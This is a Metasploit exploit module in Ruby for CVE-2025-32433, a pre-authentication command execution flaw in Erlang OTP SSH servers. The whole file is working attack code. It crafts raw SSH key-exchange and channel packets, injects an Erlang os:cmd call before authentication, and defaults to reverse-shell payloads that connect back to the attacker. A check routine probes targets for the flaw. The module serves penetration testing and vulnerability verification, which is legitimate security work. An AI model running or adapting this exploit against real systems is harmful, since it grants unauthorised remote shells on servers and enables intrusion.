##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'hrr_rb_ssh/message/090_ssh_msg_channel_open'
require 'hrr_rb_ssh/message/098_ssh_msg_channel_request'
require 'hrr_rb_ssh/message/020_ssh_msg_kexinit'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Erlang OTP Pre-Auth RCE Scanner and Exploit',
        'Description' => %q{
          This module detect and exploits CVE-2025-32433, a pre-authentication vulnerability in Erlang-based SSH
          servers that allows remote command execution. By sending crafted SSH packets, it executes a payload to
          establish a reverse shell on the target system.

          The exploit leverages a flaw in the SSH protocol handling to execute commands via the Erlang `os:cmd`
          function without requiring authentication.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Horizon3 Attack Team',
          'Matt Keeley', # PoC
          'Martin Kristiansen', # PoC
          'mekhalleh (RAMELLA Sebastien)' # module author powered by EXA Reunion (https://www.exa.re/)
        ],
        'References' => [
          ['CVE', '2025-32433'],
          ['URL', 'https://x.com/Horizon3Attack/status/1912945580902334793'],
          ['URL', 'https://platformsecurity.com/blog/CVE-2025-32433-poc'],
          ['URL', 'https://github.com/ProDefense/CVE-2025-32433']
        ],
        'Platform' => ['linux', 'unix'],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [
            'Linux Command', {
              'Platform' => 'linux',
              'Arch' => ARCH_CMD,
              'Type' => :linux_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/linux/https/x64/meterpreter/reverse_tcp'
                # cmd/linux/http/aarch64/meterpreter/reverse_tcp has also been tested successfully with this module.
              }
            }
          ],
          [
            'Unix Command', {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2025-04-16',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(22),
      OptString.new('SSH_IDENT', [true, 'SSH client identification string sent to the server', 'SSH-2.0-OpenSSH_8.9'])
    ])
  end

  # builds SSH_MSG_CHANNEL_OPEN for session
  def build_channel_open(channel_id)
    msg = HrrRbSsh::Message::SSH_MSG_CHANNEL_OPEN.new
    payload = {
      'message number': HrrRbSsh::Message::SSH_MSG_CHANNEL_OPEN::VALUE,
      'channel type': 'session',
      'sender channel': channel_id,
      'initial window size': 0x68000,
      'maximum packet size': 0x10000
    }
    msg.encode(payload)
  end

  # builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload
  def build_channel_request(channel_id, command)
    msg = HrrRbSsh::Message::SSH_MSG_CHANNEL_REQUEST.new
    payload = {
      'message number': HrrRbSsh::Message::SSH_MSG_CHANNEL_REQUEST::VALUE,
      'recipient channel': channel_id,
      'request type': 'exec',
      'want reply': true,
      command: "os:cmd(\"#{command}\")."
    }
    msg.encode(payload)
  end

  # builds a minimal but valid SSH_MSG_KEXINIT packet
  def build_kexinit
    msg = HrrRbSsh::Message::SSH_MSG_KEXINIT.new
    payload = {}
    payload[:"message number"] = HrrRbSsh::Message::SSH_MSG_KEXINIT::VALUE
    # The definition for SSH_MSG_KEXINIT in 020_ssh_msg_kexinit.rb expects each cookie byte to be its own field. The
    # encode method expects a hash and so we need to duplicate the "cookie (random byte)" key in the hash 16 times.
    16.times do
      payload[:"cookie (random byte)".dup] = SecureRandom.random_bytes(1).unpack1('C')
    end
    payload[:kex_algorithms] = ['curve25519-sha256', 'ecdh-sha2-nistp256', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group14-sha256']
    payload[:server_host_key_algorithms] = ['rsa-sha2-256', 'rsa-sha2-512']
    payload[:encryption_algorithms_client_to_server] = ['aes128-ctr']
    payload[:encryption_algorithms_server_to_client] = ['aes128-ctr']
    payload[:mac_algorithms_client_to_server] = ['hmac-sha1']
    payload[:mac_algorithms_server_to_client] = ['hmac-sha1']
    payload[:compression_algorithms_client_to_server] = ['none']
    payload[:compression_algorithms_server_to_client] = ['none']
    payload[:languages_client_to_server] = []
    payload[:languages_server_to_client] = []
    payload[:first_kex_packet_follows] = false
    payload[:"0 (reserved for future extension)"] = 0
    msg.encode(payload)
  end

  # formats a list of names into an SSH-compatible string (comma-separated)
  def name_list(names)
    string_payload(names.join(','))
  end

  # pads a packet to match SSH framing
  def pad_packet(payload, block_size)
    min_padding = 4
    payload_length = payload.length
    padding_len = block_size - ((payload_length + 5) % block_size)
    padding_len += block_size if padding_len < min_padding
    [(payload_length + 1 + padding_len)].pack('N') +
      [padding_len].pack('C') +
      payload +
      "\x00" * padding_len
  end

  # helper to format SSH string (4-byte length + bytes)
  def string_payload(str)
    s_bytes = str.encode('utf-8')
    [s_bytes.length].pack('N') + s_bytes
  end

  def check
    print_status('Starting scanner for CVE-2025-32433')

    connect
    sock.put("#{datastore['SSH_IDENT']}\r\n")
    banner = sock.get_once(1024, 10)
    unless banner
      return Exploit::CheckCode::Unknown('No banner received')
    end

    unless banner.to_s.downcase.include?('erlang')
      return Exploit::CheckCode::Safe("Not an Erlang SSH service: #{banner.strip}")
    end

    sleep(0.5)

    print_status('Sending SSH_MSG_KEXINIT...')
    kex_packet = build_kexinit
    sock.put(pad_packet(kex_packet, 8))
    sleep(0.5)

    response = sock.get_once(1024, 5)
    unless response
      return Exploit::CheckCode::Detected("Detected Erlang SSH service: #{banner.strip}, but no response to KEXINIT")
    end

    print_status('Sending SSH_MSG_CHANNEL_OPEN...')
    chan_open = build_channel_open(0)
    sock.put(pad_packet(chan_open, 8))
    sleep(0.5)

    print_status('Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...')
    chan_req = build_channel_request(0, Rex::Text.rand_text_alpha(rand(4..8)).to_s)
    sock.put(pad_packet(chan_req, 8))
    sleep(0.5)

    begin
      sock.get_once(1024, 5)
    rescue EOFError, Errno::ECONNRESET
      return Exploit::CheckCode::Safe('The target is not vulnerable to CVE-2025-32433.')
    end
    sock.close

    report_vuln(
      host: datastore['RHOST'],
      name: name,
      refs: references,
      info: 'The target is vulnerable to CVE-2025-32433.'
    )
    Exploit::CheckCode::Vulnerable
  rescue Rex::ConnectionError
    Exploit::CheckCode::Unknown('Failed to connect to the target')
  rescue Rex::TimeoutError
    Exploit::CheckCode::Unknown('Connection timed out')
  ensure
    disconnect unless sock.nil?
  end

  def exploit
    print_status('Starting exploit for CVE-2025-32433')
    connect
    sock.put("SSH-2.0-OpenSSH_8.9\r\n")
    banner = sock.get_once(1024)
    if banner
      print_good("Received banner: #{banner.strip}")
    else
      fail_with(Failure::Unknown, 'No banner received')
    end
    sleep(0.5)

    print_status('Sending SSH_MSG_KEXINIT...')
    kex_packet = build_kexinit
    sock.put(pad_packet(kex_packet, 8))
    sleep(0.5)

    print_status('Sending SSH_MSG_CHANNEL_OPEN...')
    chan_open = build_channel_open(0)
    sock.put(pad_packet(chan_open, 8))
    sleep(0.5)

    print_status('Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...')
    chan_req = build_channel_request(0, payload.encoded)
    sock.put(pad_packet(chan_req, 8))

    begin
      response = sock.get_once(1024, 5)
      if response
        print_status('Packets sent successfully and receive response from the server')

        hex_response = response.unpack('H*').first
        vprint_status("Received response: #{hex_response}")

        if hex_response.start_with?('000003')
          print_good('Payload executed successfully')
        else
          print_error('Payload execution failed')
        end
      end
    rescue EOFError, Errno::ECONNRESET
      print_error('Payload execution failed')
    rescue Rex::TimeoutError
      print_error('Connection timed out')
    end

    sock.close
  rescue Rex::ConnectionError
    fail_with(Failure::Unreachable, 'Failed to connect to the target')
  rescue Rex::TimeoutError
    fail_with(Failure::TimeoutExpired, 'Connection timed out')
  rescue StandardError => e
    fail_with(Failure::Unknown, "Error: #{e.message}")
  end

end
